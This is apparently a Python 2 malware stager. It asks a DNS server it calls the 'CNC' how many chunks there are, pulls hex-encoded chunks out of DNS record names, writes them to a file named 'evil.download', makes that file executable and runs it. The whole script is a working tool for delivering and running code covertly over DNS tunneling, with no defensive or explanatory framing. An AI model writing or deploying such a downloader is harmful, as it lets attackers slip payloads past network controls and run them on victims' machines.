
from dnslib import *
import sys
import socket
import struct

dname = 'domain.com'

qname = dname
query = DNSRecord(q=DNSQuestion(qname))
query_data = query.pack()

#dnsserver = '192.168.1.1'
dnsserver = '127.0.0.1'
port = 53
timeout = 5

# Query to find the number of chunks

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(query_data, (dnsserver, port))

# Query for each chunk, and assemble it all together into the binary.

print 'Contacting CNC.'
response = sock.recv(8192)
resp_r = DNSRecord.parse(response)

# Get the answer
_, _, h, l = resp_r.a.rdata.data
num_chunks = (h << 8) + l

#print 'Number of chunks:', num_chunks

# Fetch each of the chunks
blocks = {}

print 'Fetching chunks.'
for chunk in range(num_chunks):
    #print "Requesting chunk %d" % chunk

    qname = str(chunk) + '.' + dname
    query = DNSRecord(q=DNSQuestion(qname))
    query_data = query.pack()   
    
    sock.sendto(query_data, (dnsserver, port)) 
    
    response = sock.recv(8192)
    resp_r = DNSRecord.parse(response)    
    
    #print 'Received', resp_r
    for record in resp_r.rr:
        record_rname = str(record.rname)
        prefix = record_rname[:record_rname.find('.')]
        
        encoded_block = prefix[-32:]
        block_index = int(prefix[:-32])

        # Recording block
        #print "Received block_index: %d chunk_index: %d block_data: %s" % (block_index, chunk, encoded_block)
        blocks[block_index] = encoded_block.decode('hex')

# Relieve server
print 'Requesting STOP.'
qname = 'stop' + '.' + qname
query = DNSRecord(q=DNSQuestion(qname))
query_data = query.pack()   
sock.sendto(query_data, (dnsserver, port)) 
    
assert range(len(blocks)) == blocks.keys()

# Execute the binary
with open('evil.download', 'w') as w:
    for i in range(len(blocks)):
        w.write(blocks[i])
        
# Setting permissions
import os
print 'Setting permissions'
os.chmod('evil.download', 0555)

import subprocess
subprocess.call(['./evil.download'])
